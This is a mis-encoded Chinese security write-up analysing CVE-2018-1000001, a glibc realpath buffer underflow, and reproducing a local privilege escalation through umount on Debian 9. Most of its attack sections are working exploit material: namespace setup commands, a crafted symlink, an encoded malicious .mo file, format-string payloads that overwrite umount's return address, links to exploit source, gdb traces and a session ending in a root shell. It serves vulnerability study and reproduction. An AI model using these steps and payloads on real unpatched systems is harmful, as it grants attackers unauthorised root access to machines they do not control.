> åŸæ–‡é“¾æ¥: https://www.anquanke.com//post/id/205197 


# Glibcæœ¬åœ°ææƒæ¼æ´åˆ†æï¼ˆCVE-2018-1000001ï¼‰


                                é˜…è¯»é‡ Â Â 
                                **276815**
                            
                        |
                        
                                                                                    



[![](https://p1.ssl.qhimg.com/t01f47dbe3ad7c71b0c.jpg)](https://p1.ssl.qhimg.com/t01f47dbe3ad7c71b0c.jpg)



## 1. èƒŒæ™¯ä»‹ç»
- æ¼æ´ç›¸å…³è½¯ä»¶ï¼šglibc &lt;= 2.26
<li>GLibcç®€ä»‹
<ul>
- GNU/Linux systemsç­‰ä½¿ç”¨Linuxå†…æ ¸ç³»ç»Ÿçš„æ ¸å¿ƒCä»£ç åº“
- è¿™äº›ä»£ç åº“æä¾›ä¸¥æ ¼éµå¾ªISO C11, POSIX.1-2008, BSDç­‰æ ‡å‡†çš„API
- è¿™äº›APIåŒ…å« open, read, write, malloc, printfç­‰åŸºæœ¬å‡½æ•°
<li>
[å‚è€ƒä¸€(GLIBC å®˜ç½‘)](https://www.gnu.org/software/libc/libc.html), [å‚è€ƒäºŒ(Linux manual)](http://man7.org/linux/man-pages/man7/libc.7.html)
</li>- å¯¹æœªå®‰è£…è¡¥ä¸çš„Linuxç³»ç»Ÿè¿›è¡Œæœ¬åœ°ææƒã€‚
- [å‚è€ƒ: Known Affected Software Configurations](https://nvd.nist.gov/vuln/detail/CVE-2018-1000001)


## 2. æ¼æ´åˆ†æ
- æ¼æ´åŸç†ï¼šç¼“å†²åŒºè¾¹ç•Œåˆ¤æ–­ä¸ä¸¥æ ¼é€ æˆè¶Šç•Œå†™ã€‚
<li>æ¼æ´æ‰€å±è½¯ä»¶é“¾æ¥ï¼Œç‰ˆæœ¬ï¼Œæ¨¡å—ï¼Œç›®å½•ï¼Œæ–‡ä»¶ï¼Œä»£ç è¡Œ
<ul>
- æ¼æ´è½¯ä»¶ç‰ˆæœ¬ï¼šglibc &lt;= 2.26
<li>æ¼æ´ä»£ç ä½ç½®ï¼š`glibc-2.26/stdlib/canonicalize.c -&gt; __realpath( line 122, 199 )`
</li>
<li>
[GLibc å®˜ç½‘](https://www.gnu.org/software/libc/libc.html)[GLibc æºç åº“](http://ftp.gnu.org/gnu/glibc/)
</li>


## 3. POC

##### <a class="reference-link" name="a.%20POC%E5%8E%9F%E7%90%86"></a>a. POCåŸç†

æ„é€ ç‰¹æ®Šçš„namespaceè¿›ç¨‹(ä¸‹æ–‡ç§°ns_proc)ï¼Œå¹¶åœ¨è¿›ç¨‹çš„å·¥ä½œç›®å½•ä¸‹æ„å»ºç‰¹æ®Šçš„ç›®å½•ç»“æ„ï¼ŒåŒ…å«ç‰¹åˆ¶çš„ç¬¦å·é“¾æ¥ï¼Œå’Œç‰¹åˆ¶çš„NLSæ–‡ä»¶ï¼›

ä½¿umountåœ¨ns_procè¿›ç¨‹çš„å·¥ä½œç›®å½•ä¸‹è¿è¡Œï¼Œå¸è½½ç‰¹åˆ¶çš„ç¬¦å·é“¾æ¥è§¦å‘è¶Šç•Œå†™ï¼Œè¦†ç›–setloacleéœ€è¦åŠ è½½çš„æ­£å¸¸æ–‡ä»¶è·¯å¾„ï¼Œè¿«ä½¿å…¶ä½¿ç”¨ç›¸å¯¹è·¯å¾„åŠ è½½ç‰¹åˆ¶çš„ NLSæ–‡ä»¶ï¼›

ç‰¹åˆ¶NLSæ–‡ä»¶èƒ½å¤Ÿæ§åˆ¶umountçš„errorä¿¡æ¯çš„æ ¼å¼ï¼Œå¯ä»¥åˆ©ç”¨`%n`è·å–å†™å…¥æ ˆå†…å­˜çš„èƒ½åŠ›ï¼Œè€Œåˆšå¥½èƒ½å¤Ÿä¿®æ”¹umount libmnt_contextç»“æ„ä½“çš„restrictedæ ‡å¿—ä½ï¼Œä½¿umountè®¤ä¸ºè°ƒç”¨è€…ä¸ºrootæƒé™ï¼Œè¿›è€Œå…è®¸åç»­çš„`umout /`æ“ä½œï¼Œä»è€Œå®ç°DOSã€‚

##### <a class="reference-link" name="b.%20POC%E6%BA%90%E7%A0%81"></a>b. POCæºç 

é“¾æ¥: [https://pan.baidu.com/s/11kHwHoFTkJ2sJT36kzNRKw](https://pan.baidu.com/s/11kHwHoFTkJ2sJT36kzNRKw) å¯†ç :vffy

##### <a class="reference-link" name="c.%20%E5%A4%8D%E7%8E%B0%E6%AD%A5%E9%AA%A4"></a>c. å¤ç°æ­¥éª¤
<li>å¤ç°ç¯å¢ƒ
<ul>
<li>ç¯å¢ƒæ¸…å•
<ul>
- ç³»ç»Ÿç‰ˆæœ¬: Linux debian 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64 GNU/Linux
- å‘è¡Œç‰ˆåç§°: Debian GNU/Linux 9 (stretch)
- glibcç‰ˆæœ¬: Debian GLIBC 2.24-11+deb9u4
- gccç‰ˆæœ¬: gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516
- umountç‰ˆæœ¬: umount from util-linux 2.29.2
<li>é•œåƒä¸‹è½½åœ°å€ï¼š[debian-9.12.0-amd64-DVD-1.iso](https://cdimage.debian.org/mirror/cdimage/archive/9.12.0/amd64/iso-dvd/debian-9.12.0-amd64-DVD-1.iso)
</li>
- è™šæ‹Ÿæœºè½¯ä»¶ï¼šVMwareFusion ä¸“ä¸šç‰ˆ 11.5.1 (15018442)
- è™šæ‹Ÿæœºè½¯ä»¶ï¼šQEMU emulator version 4.2.0
```
# 1. å»ä¸Šé¢ğŸ‘†ç»™å‡ºçš„åœ°å€å¤„ä¸‹è½½é•œåƒ
# 2. åˆ›å»ºè™šæ‹Ÿæœºç¡¬ç›˜
$ qemu-img create -f qcow2 debian9.img 10G

# 3. å®‰è£…è™šæ‹Ÿæœº(æœ‰æ¡ä»¶å¯ä»¥å¢åŠ -enable-kvmé€‰é¡¹)
# åˆ¤æ–­æ–¹æ³•ï¼š
#   grep -E 'vmx|svm' /proc/cpuinfo
#   lsmod | grep kvm
$ qemu-system-x86_64  -m 2048 -hda debian9.img  -cdrom ./debian-9.12.0-amd64-DVD-1.iso

# 4. å¯åŠ¨è™šæ‹Ÿæœº
$ qemu-system-x86_64 -m 2048  debian9.img

# 5. å¯åŠ¨åå®‰è£…GCC
$ su
$ apt install gcc
```

Step1 â€“ è®¾ç½®unprivileged_userns_cloneæƒé™

```
# å°†unprivileged_userns_cloneè®¾ç½®ä¸º1(é»˜è®¤ä¸º0)
root$ echo 1 &gt; /proc/sys/kernel/unprivileged_userns_clone
```

Step2 â€“ åˆ›å»ºå…·æœ‰ç‹¬ç«‹ user/mount namespaceçš„è¿›ç¨‹(ä¸‹æ–‡ç§°us_proc)

å…¶ä»–è¿›ç¨‹è¿›å…¥`us_proc`è¿›ç¨‹çš„`"/proc/[us_proc pid]/cwd"`ç›®å½•åï¼Œç”¨`realpath(getcwd)`è·å–çš„ç›¸å¯¹ç›®å½•å‡åŒ…å«`"(unreachable)/tmp/"`å‰ç¼€

```
/usr/bin/unshare -m -U --map-root-user /bin/bash
mount -t tmpfs tmpfs /tmp
cd /tmp
chmod 00755 .

# Terminal 1
debian@debian:~/Desktop/work$ /usr/bin/unshare -m -U --map-root-user /bin/bash
root@debian:~/Desktop/work# mount -t tmpfs tmpfs /tmp
root@debian:~/Desktop/work# cd /tmp
root@debian:/tmp# chmod 00755 .
root@debian:/tmp# echo $$
52426
root@debian:/tmp# 

# æ•ˆæœå¦‚ä¸‹
# Terminal 2
$ cd /proc/52426/cwd
debian@debian:/proc/52426/cwd$ 
debian@debian:/proc/52426/cwd$ realpath .
(unreachable)/tmp
debian@debian:/proc/52426/cwd$ realpath ../x
(unreachable)/x
debian@debian:/proc/52426/cwd
```

Step3 â€“ åˆ›å»ºæ¼æ´åˆ©ç”¨éœ€è¦çš„ç›®å½•å’Œæ–‡ä»¶

```
mkdir -p -- "(unreachable)/tmp" "(unreachable)/tmp/__gconv_find_shlib/C/LC_MESSAGES" "(unreachable)/x"
ln -s ../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A "(unreachable)/tmp/down"
base64 -d &lt;&lt;B64-EOF | bzip2 -cd &gt; "(unreachable)/tmp/__gconv_find_shlib/C/LC_MESSAGES/util-linux.mo"
QlpoOTFBWSZTWTOfm9IAAGX/pn6UlARGB+FeKyZnAD/n3mACAAAgAAEgAJSIqfkpspk0eUGJ6gAG
mQeoaD1PJAamlPJGCNMTIaNGmnqMQ0AAzSwpEWpQICVUw+490ohZBgZ+s4EBAZCn/TavSQshtCiv
iG6HOehyAp4FPt3zkpdTxNchTYITLBkXUjsgpN2QDBNX8qmbpkVgfLXKcQc1ZhVF0FxUQOtnbGlL
5NhRmORwmQF1Dw3Yu1mds6tGAmnLwWwc2KRKGl5hcLuSKcKEgZz83pA=
B64-EOF

root@debian:/tmp# tree
.
â””â”€â”€ (unreachable)
    â”œâ”€â”€ tmp
    â”‚   â”œâ”€â”€ down -&gt; ../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A
    â”‚   â””â”€â”€ __gconv_find_shlib
    â”‚       â””â”€â”€ C
    â”‚           â””â”€â”€ LC_MESSAGES
    â”‚               â””â”€â”€ util-linux.mo
    â””â”€â”€ x


root@debian:/tmp# strings "(unreachable)/tmp/__gconv_find_shlib/C/LC_MESSAGES/util-linux.mo"
%s: not mounted
Language: en
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
AA%6$lnlnAAAAAAAAAA
```

`__gconv_find_shlib/C/LC_MESSAGES`ç›®å½•æ˜¯setloacaleå¯»æ‰¾moæ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„ï¼Œç‰¹åˆ«è¦æ³¨æ„çš„ä¸€ç‚¹ï¼š`__gconv_find_shlib` åœ¨ä¸åŒç³»ç»Ÿä¸Šä¸ä¸€æ ·ï¼Œåœ¨æ¼æ´ä½œè€…çš„expä¸­è¿˜ç»™å‡ºäº†ä¸¤ä¸ªç›®å½•(`from_archive, _nl_load_locale_from_archive`) ï¼›

`"(unreachable)/x"` æ˜¯realpathè§£æç¬¦å·é“¾æ¥çš„è¿”å›å€¼å¯¹åº”çš„ç›®å½•ï¼›

`util-linux.mo`æ–‡ä»¶ç”¨äºä¿å­˜ç‰¹åˆ¶çš„libcä¾èµ–çš„.moç¿»è¯‘æ–‡ä»¶ï¼›

ç¬¦å·é“¾æ¥ç”¨äºè§¦å‘è¶Šç•Œå†™æ¼æ´ï¼›

`util-linux.mo`ä¿å­˜äº†è§¦å‘DOSçš„ç‰¹åˆ¶æ ¼å¼åŒ–å­—ç¬¦ä¸²`"AA%6$lnlnAAAAAAAAAA"`ã€‚

Step4 â€“ é€šè¿‡umountè§¦å‘DOS

```
test$ cd /proc/2299/cwd
test$ LC_ALL=C.UTF-8 /bin/umount --lazy down /
AAlnAAAAAAAAAA
```

LC_ALLç¯å¢ƒå˜é‡ä¼šä½¿setlocaleå‡½æ•°å»åŠ è½½ç¿»è¯‘æ–‡ä»¶ï¼›

umountä¼šå…ˆå°è¯•å¸è½½downç›®å½•ï¼Œè¿™ä¸ªç‰¹åˆ¶çš„ç¬¦å·é“¾æ¥ä¼šè§¦å‘realpathæ¼æ´é€ æˆè¶Šç•Œå†™ï¼Œå°†å †å†…å­˜ä¸­çš„`"/usr/lib/locale/C.utf8/LC_CTYPE"`è·¯å¾„å­—ç¬¦ä¸²ä¸­LC_CTYPEè¦†ç›–ä¸º`AAAAAA(ç•¥...)/A`ï¼›

å½“realpathå°†downè§£æä¸º(unreachable)/xåï¼Œumountä¼šè°ƒç”¨warnxå‡½æ•°æ‰“å°è­¦å‘Šä¿¡æ¯ï¼Œæ­¤æ—¶ä¼šåŠ è½½ç‰¹åˆ¶çš„util-linux.moæ–‡ä»¶ï¼Œ`"AA%6$lnlnAAAAAAAAAA"`æ›¿æ¢æ‰warnxå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°`"%s: not mounted"`ï¼›

åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œumountæ ˆä¸­RSPå­˜æ”¾çš„åœ°å€å¤„çš„æŒ‡é’ˆæŒ‡å‘çš„`long intå€¼(*(long *)$RSP)`ä¼šè¢«ä¿®æ”¹ä¸º2ã€‚è¿™ä¼šå°†è¯¥å¤„å­˜æ”¾çš„libmnt_contextç»“æ„ä½“çš„restrictedå­—æ®µä¿®æ”¹ä¸º0, ä»è€Œè®©umountè®¤ä¸ºè°ƒç”¨è€…æ˜¯rootç”¨æˆ·ï¼Œå¹¶æˆåŠŸè¿›è¡Œåé¢çš„umount / æ“ä½œã€‚

è¿™ä¸ªæ­¥éª¤ç›¸å…³çš„umountè°ƒç”¨æ ˆ:

`main-&gt;umount_one-&gt;make_exit_code-&gt;warnx(_("%s: not mounted"), tgt);`

â€‹

## 4. EXP

##### <a class="reference-link" name="a.%20EXP%E5%8E%9F%E7%90%86"></a>a. EXPåŸç†

**å‡†å¤‡é˜¶æ®µ(prepareNamespacedProcess)**
<li>å…ˆé€šè¿‡cloneå¯åŠ¨ä¸€ä¸ªæ‹¥æœ‰ç‹¬ç«‹`user &amp; mount namespace`çš„å­è¿›ç¨‹ï¼Œ<br>
å­è¿›ç¨‹å¯åŠ¨åï¼Œä¼šå…ˆç­‰å¾…çˆ¶è¿›ç¨‹å°†å…¶uidå’Œgidè®¾ç½®ä¸º0(å½“å‰namespace)<br>
ç„¶å`mount tmpfs`åˆ°`/tmp`ç›®å½•ï¼Œå¹¶åˆ‡æ¢åˆ°`/tmp`ä½œä¸ºå½“å‰å·¥ä½œç›®å½•<br>
åˆ›å»ºä¸€ä¸ªreadyæ–‡ä»¶(`O_WRONLY|O_CREAT|O_EXCL|O_NOFOLLOW|O_NOCTTY`)</li>
- è·å–å½“å‰ç³»ç»Ÿä¿¡æ¯
- åœ¨cloneå‡ºçš„å­è¿›ç¨‹å·¥ä½œç›®å½•(`/proc/[pid]/cwd`)ä¸­ç”Ÿæˆä¸€ç³»åˆ—æ–‡ä»¶å’Œç›®å½•
ç”Ÿæˆçš„æ–‡ä»¶å¦‚ä¸‹ï¼š

```
invincible@ubuntu:/proc/10013/cwd$ tree
.
â”œâ”€â”€ DATEMSK
â”œâ”€â”€ ready
â””â”€â”€ (unreachable)
    â”œâ”€â”€ tmp
    â”‚   â”œâ”€â”€ down -&gt; ../x/../../AAA(çœç•¥...)A/AAA(çœç•¥...)A/A
    â”‚   â””â”€â”€ from_archive
    â”‚       â”œâ”€â”€ C.UTF-8
    â”‚       â”‚   â””â”€â”€ LC_MESSAGES
    â”‚       â”‚       â””â”€â”€ util-linux.mo
    â”‚       â”œâ”€â”€ X.x
    â”‚       â”‚   â””â”€â”€ LC_MESSAGES
    â”‚       â””â”€â”€ X.X
    â”‚           â””â”€â”€ LC_MESSAGES
    â”‚               â””â”€â”€ util-linux.mo
    â””â”€â”€ x


10 directories, 5 files 
invincible@ubuntu:/proc/10013/cwd$ cat DATEMSK 
#!/home/invincible/Desktop/test/exp
unused
invincible@ubuntu:/proc/10013/cwd$ file DATEMSK 
DATEMSK: a /home/invincible/Desktop/test/exp script, ASCII text executable

invincible@ubuntu:/proc/10013/cwd$ 
invincible@ubuntu:/proc/10013/cwd$ file ready 
ready: empty


invincible@ubuntu:/proc/10013/cwd$ file (unreachable)/tmp/from_archive/C.UTF-8/LC_MESSAGES/util-linux.mo 
(çœç•¥...)/util-linux.mo: GNU message catalog (little endian), revision 0.0, 4 messages


invincible@ubuntu:/proc/10013/cwd$ file (unreachable)/tmp/from_archive/X.X/LC_MESSAGES/util-linux.mo 
(çœç•¥...)/util-linux.mo: fifo (named pipe)
```

æ„é€ çš„DATEMSKæ–‡ä»¶å†…å®¹ä¸º/proc/self/exeç¬¦å·é“¾æ¥æŒ‡å‘çš„æ–‡ä»¶:

```
invincible@ubuntu:/proc/10013/cwd$ cat DATEMSK 
#!/home/invincible/Desktop/test/exp
unused
invincible@ubuntu:/proc/10013/cwd$ file DATEMSK 
DATEMSK: a /home/invincible/Desktop/test/exp script, ASCII text executabl
```

æ„é€ ç‰¹åˆ¶çš„util-linux.moæ–‡ä»¶å†…å®¹:

```
invincible@ubuntu:~/Desktop/test$ msgunfmt util-linux.mo -o util-linux.po
invincible@ubuntu:~/Desktop/test$ cat util-linux.po 
msgid ""
msgstr ""
"Language: enn"
"MIME-Version: 1.0n"
"Content-Type: text/plain; charset=UTF-8n"
"Content-Transfer-Encoding: 8bitn"


msgid "%s: mountpoint not found"
msgstr "1234"


msgid "%s: not mounted"
msgstr ""
"AA%6$lnAAAAAA%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx"
(çœç•¥... å…±256ä¸ª%16lx)
"%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx"
"%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%1$68hhx%256$hhn"


msgid ""
"%s: target is busyn"
"        (In some cases useful info about processes thatn"
"         use the device is found by lsof(8) or fuser(1).)"
msgstr "5678"
invincible@ubuntu:~/Desktop/test$
```

**ææƒé˜¶æ®µ(attemptEscalation)**
<li>å‡†å¤‡å·¥ä½œ
<ul>
- åˆ›å»ºç”¨äºå’Œå­è¿›ç¨‹é€šä¿¡çš„pipeç”¨äºè¯»å–å­è¿›ç¨‹stdoutå’Œstderr
- forkå‡ºå­è¿›ç¨‹(ä¸‹æ–‡ç§°`umountè¿›ç¨‹`)ï¼Œåœ¨å­è¿›ç¨‹ä¸­è®¾ç½®pipeï¼Œåˆ‡æ¢åˆ°`us_procè¿›ç¨‹`çš„å·¥ä½œç›®å½•ï¼Œexecveæ‰§è¡Œumountï¼Œå…·ä½“æ‰§è¡Œå‘½ä»¤ï¼š
```
AANGUAGE=X.X AANGUAGE=X.X (çœç•¥...å…±255æ¬¡) LC_ALL=C.UTF-8 /bin/umount  /run /run /run /run /run /run /run /run /run /run down LABEL=78 LABEL=789 LABEL=789a LABEL=789ab LABEL=789abc LABEL=789abcd LABEL=789abcde LABEL=789abcdef LABEL=789abcdef0 LABEL=789abcdef0
```
<li>å¼€å§‹ææƒ
<ul>
- ç¬¬0æ­¥ï¼Œçˆ¶è¿›ç¨‹å¼€å§‹æŒç»­è¯»å–umountè¿›ç¨‹çš„è¾“å‡ºï¼Œç­‰å¾…â€AAAAAAAAâ€å­—ç¬¦ä¸²çš„å‡ºç°
- ç¬¬1æ­¥ï¼Œè¯»å–å®Œæ•´çš„æ ˆå†…å­˜æ•°æ®ï¼Œå¹¶å¼€å§‹è§£æï¼Œæ„é€ ç¬¬äºŒé˜¶æ®µçš„util-linx.moæ–‡ä»¶å†…å®¹å¹¶å†™å…¥
- ç¬¬2æ­¥ï¼ŒæŒç»­ç­‰å¾…ï¼Œç›´åˆ°åœ¨è¶…æ—¶æ—¶é—´å†…ï¼Œç¬¬äºŒé˜¶æ®µutil-linux.moæ–‡ä»¶å†…å®¹è¢«umountè¯»å–
- ç¬¬3æ­¥ï¼Œè¯»å–å‰©ä¸‹çš„umountè¾“å‡ºé˜²æ­¢å…¶è¢«é˜»å¡
<li>umountéƒ¨åˆ†ï¼š
<ul>
- umountå¯åŠ¨åï¼Œè§£æç¬¦å·é“¾æ¥downä¼šè§¦å‘è¶Šç•Œå†™ï¼Œä½¿å †å†…å­˜ä¸­å­˜æ”¾çš„æ­£å¸¸æ–‡ä»¶è·¯å¾„å¤±æ•ˆï¼Œè¿«ä½¿å…¶åŠ è½½ä½äºç›¸å¯¹ç›®å½•C.UTF-8/LC_MESSAGES/ä¸­ç‰¹åˆ¶çš„util-linux.moæ–‡ä»¶ï¼Œå…¶ä¸­çš„ poisonous format string ä¼šå°†æ ˆå†…å­˜dumpåˆ°stderrï¼ŒåŒæ—¶è¿˜ä¼šé€šè¿‡æŒ‡å‘ç¯å¢ƒå˜é‡çš„æŒ‡é’ˆï¼Œå°†â€AANGUAGE=X.Xâ€ä¿®æ”¹ä¸ºâ€LANGUAGE=X.Xâ€
- umountç»§ç»­æ‰§è¡Œï¼Œç”±äºç¯å¢ƒå˜é‡è¢«ä¿®æ”¹ï¼Œè¿™å°†ä½¿umountè¯»å–ç¬¬äºŒé˜¶æ®µçš„util-linux.moæ–‡ä»¶(ä½äºX.X/LC_MESSAGESç›®å½•ä¸‹ï¼Œç”±äºè¯¥æ–‡ä»¶ä¸ºfifo named pipeï¼Œæ‰€ä»¥è¿™é‡Œumounä¼šé˜»å¡ç­‰å¾…å…¶è¢«å†™å…¥æ•°æ®)
- umountè¿›ç¨‹åœ¨çˆ¶è¿›ç¨‹ç¬¬1æ­¥å®Œæˆåæ¢å¤æ‰§è¡Œï¼Œè¯»å–ç¬¬äºŒé˜¶æ®µmoæ–‡ä»¶ï¼Œå…¶ä¸­çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²å°†ä¼šä¿®æ”¹umountçš„è¿”å›åœ°å€ï¼Œé€šè¿‡setdate+execlå®ç°ROPï¼Œæœ€ç»ˆæ‰§è¡ŒDATEMSKæ–‡ä»¶ä¸­çš„expè¿›ç¨‹ï¼Œåˆ©ç”¨umountæå‡expå¯æ‰§è¡Œæ–‡ä»¶çš„æƒé™åæ‰§è¡Œï¼Œç”Ÿæˆroot shellå®Œæˆææƒ
```
"AA%6$lnAAAAAA%016lx(çœç•¥... å…±256ä¸ª%016lx)%016lx%1$68hhx%256$hhn"
```
- ä¿®æ”¹è¿”å›åœ°å€ä½¿ç”¨çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²
```
debian@debian:~/Desktop/work$ msgunfmt "/proc/1609/cwd/(unreachable)/tmp/__gconv_find_shlib/X.x/LC_MESSAGES/util-linux.mo" -o util-linux.po
debian@debian:~/Desktop/work$ cat util-linux.po 
msgid ""
msgstr ""
"Language: enn"
"MIME-Version: 1.0n"
"Content-Type: text/plain; charset=UTF-8n"
"Content-Transfer-Encoding: 8bitn"


msgid "%s: mountpoint not found"
msgstr ""
"%67$hn%71$hn%1$18640.18640s%68$hn%1$13200.13200s%64$hn%1$906.906s%66$hn%70$hn"
"%1$1567.1567s%65$hn%1$1.1s%69$hn%1$31222.31222s%1$5414.5414s%1$s%1$s%63$hn"
"%1$s%1$s%1$s%1$s%1$s%1$s%1$186.186s%37$hn-%35$lx-%37$lx-%62$lx-%63$lx-%64$lx-"
"%65$lx-%66$lx-%67$lx-%68$lx-%69$lx-%78$sn"


msgid "%s: not mounted"
msgstr "BBBB5678%3$sn"


msgid ""
"%s: target is busyn"
"        (In some cases useful info about processes thatn"
"         use the device is found by lsof(8) or fuser(1).)"
msgstr "BBBBABCD%sn"
```

##### <a class="reference-link" name="b.%20EXP%E6%BA%90%E7%A0%81"></a>b. EXPæºç 

â€‹ å¤ç°ç¯å¢ƒexp: [https://pan.baidu.com/s/1oaKWzCzqwdkhywu8JOmivQ](https://pan.baidu.com/s/1oaKWzCzqwdkhywu8JOmivQ) å¯†ç :60vv

â€‹ åŸä½œè€…exp: [exp.c](https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c)

##### <a class="reference-link" name="c.%20%E5%A4%8D%E7%8E%B0%E6%AD%A5%E9%AA%A4"></a>c. å¤ç°æ­¥éª¤
- æ­å»ºå¤ç°ç¯å¢ƒï¼Œä¸POCä¸­çš„ç¯å¢ƒç›¸åŒ
- æ­¥éª¤ä¸€ è®¾ç½®unprivileged_userns_cloneæƒé™
```
# å°†unprivileged_userns_cloneè®¾ç½®ä¸º1(é»˜è®¤ä¸º0)
root$ echo 1 &gt; /proc/sys/kernel/unprivileged_userns_clone
```
<li>æ­¥éª¤äºŒ ç¼–è¯‘expæ–‡ä»¶
ä½¿ç”¨çš„æ˜¯ä¿®æ”¹è¿‡çš„expï¼Œå…·ä½“ä¿®æ”¹äº†åŠ è½½moçš„ç›®å½•å’Œexeclçš„ç›¸å¯¹åç§»ä»¥é€‚é…å¤ç°ç¯å¢ƒ
</li>
```
gcc exp.c -o exp
```
- æ­¥éª¤ä¸‰ æ‰§è¡Œexp
```
debian@debian:~/Desktop/work$ id
uid=1000(debian) gid=1000(debian) groups=1000(debian),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth),113(lpadmin),118(scanner)
debian@debian:~/Desktop/work$ ./exp
./exp: invoked as SUID, invoking shell ...
root@debian:~/Desktop/work# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth),113(lpadmin),118(scanner),1000(debian)
root@debian:~/Desktop/work#
```
- å¦‚ä½•è·å–util-linx.moæ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„
```
# å®šä½åˆ°_nl_find_msgè°ƒç”¨ï¼Œæ‰¾åˆ°ç¬¬ä¸€ä¸ªå‚æ•°çš„å€¼
char *_nl_find_msg (struct loaded_l10nfile *domain_file,
            struct binding *domainbinding, const char *msgid,
            int convert, size_t *lengthp)
     internal_function;


# Terminal 1
/usr/bin/unshare -m -U --map-root-user /bin/bash
mount -t tmpfs tmpfs /tmp
cd /tmp
chmod 00755 .
mkdir -p -- "(unreachable)/tmp" "(unreachable)/tmp/xxx/C.UTF-8.utf8/LC_MESSAGES" "(unreachable)/x" 
ln -s ../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A "(unreachable)/tmp/down"
echo $$
46416


# Terminal 2
cd /proc/46416/cwd
gdb
file /bin/umount
set args --lazy down 
set env LC_ALL=C.UTF-8
b main
r
b *umount_one if *(char *)$rsi == '('
c
b mk_exit_code
c
b *__dcigettext+1265
c


# é€šè¿‡è°ƒç”¨ä¿¡æ¯æ‰¾åˆ°ç¬¬ä¸€ä¸ªå‚æ•°
"(unreachable)/tmp/__gconv_find_shlib/C.UTF-8/LC_MESSAGES/util-linux.mo"
# å› æ­¤ç›¸å¯¹è·¯å¾„åº”æ”¹ä¸ºï¼š__gconv_find_shlib(åŸexpä¸­æ˜¯from_archive)
[---------------------------------registers-------------------------
...
RCX: 0x1 
RDX: 0x55698c49ee78 ("%s: not mounted")
RSI: 0x55698e233200 ("AAAAAA/A")
RDI: 0x55698e23be90 --&gt; 0x55698e23c3b0 ("(unreachable)/tmp/__gconv_find_shlib/C.UTF-8/LC_MESSAGES/util-linux.mo")
...
R8 : 0x7fff5515b1b8 --&gt; 0x7fb5d5b84000 --&gt; 0x7fb5d572e000 --&gt; 0x10102464c457f 
...
[-------------------------------------code-------------------------
...
=&gt; 0x7fb5d4d69d21 &lt;__dcigettext+1265&gt;:    call   0x7fb5d4d68bc0 &lt;_nl_find_msg&gt;
 ...
Guessed arguments:
arg[0]: 0x55698e23be90 --&gt; 0x55698e23c3b0 ("(unreachable)/tmp/__gconv_find_shlib/C.UTF-8/LC_MESSAGES/util-linux.mo")
arg[1]: 0x55698e233200 ("AAAAAA/A")
arg[2]: 0x55698c49ee78 ("%s: not mounted")
arg[3]: 0x1 
arg[4]: 0x7fff5515b1b8 --&gt; 0x7fb5d5b84000 --&gt; 0x7fb5d572e000 --&gt; 0x10102464c457f 


Breakpoint 4, 0x00007fb5d4d69d21 in __dcigettext (
...
gdb-peda$ 


# è°ƒç”¨æ ˆå¦‚ä¸‹
gdb-peda$ bt
#0  0x00007fb5d4d69d21 in __dcigettext (
    domainname=0x55698e233580 "util-linux", 
    msgid1=0x55698c49ee78 "%s: not mounted", 
    msgid2=0x0, plural=0x0, n=0x0, 
    category=0x5) at dcigettext.c:742
#1  0x000055698c49d68d in mk_exit_code (cxt=0x55698e2335a0, rc=0xffffffff)
    at sys-utils/umount.c:206
#2  0x000055698c49dba1 in umount_one (cxt=0x55698e2335a0, spec=...
#3  0x000055698c49d152 in main (argc=0x0, argc@entry=0x3, ...
#4  0x00007fb5d4d5c2e1 in __libc_start_main (main=0x55698c49c970 ...
#5  0x000055698c49d3aa in _start ()
```
- å¦‚ä½•åœ¨umountä¸­dumpæ ˆå†…å­˜çš„ä½ç½®ä¸‹æ–­ç‚¹
```
gcc my_exp.c -o exp4dbg -g
gdb
file exp4dbg
b main
r
set follow-fork-mode parent
b attemptEscalation
c
set follow-fork-mode child
c
b *umount_one if *(char *)$rsi == '('
c
b mk_exit_code
c
b *mk_exit_code+165
c


=&gt; 0x561465315695 &lt;mk_exit_code+165&gt;: call   0x561465314560 &lt;warnx@plt&gt;


gdb-peda$ bt
#0  0x0000561465315695 in mk_exit_code (cxt=0x5614658005a0, ...
#1  0x0000561465315ba1 in umount_one (cxt=0x5614658005a0, spec=...
#2  0x0000561465315152 in main (argc=0xa, argc@entry=0x16, 
...
#3  0x00007f29943012e1 in __libc_start_main (main=0x561465314970 ...
#4  0x00005614653153aa in _start ()
gdb-peda$
```



## 5.å…¶ä»–

Linux x64 ä¼ å‚

```
RCX: 0x64 ('d')
RDX: 0x63 ('c')
RSI: 0x62 ('b')
RDI: 0x61 ('a')


R8 : 0x65 ('e')
R9 : 0x66 ('f')


RBP: 0x7fffffffde00 --&gt; 0x4005c0 (&lt;__libc_csu_init&gt;:    push   r15)
RSP: 0x7fffffffddf0 --&gt; 0x67 ('g')


[------------------------------------stack-------------------------------------]
0000| 0x7fffffffddf0 --&gt; 0x67 ('g')
0008| 0x7fffffffddf8 --&gt; 0x68 ('h')


# å…ˆpush 'h' åpush 'g'

```

```
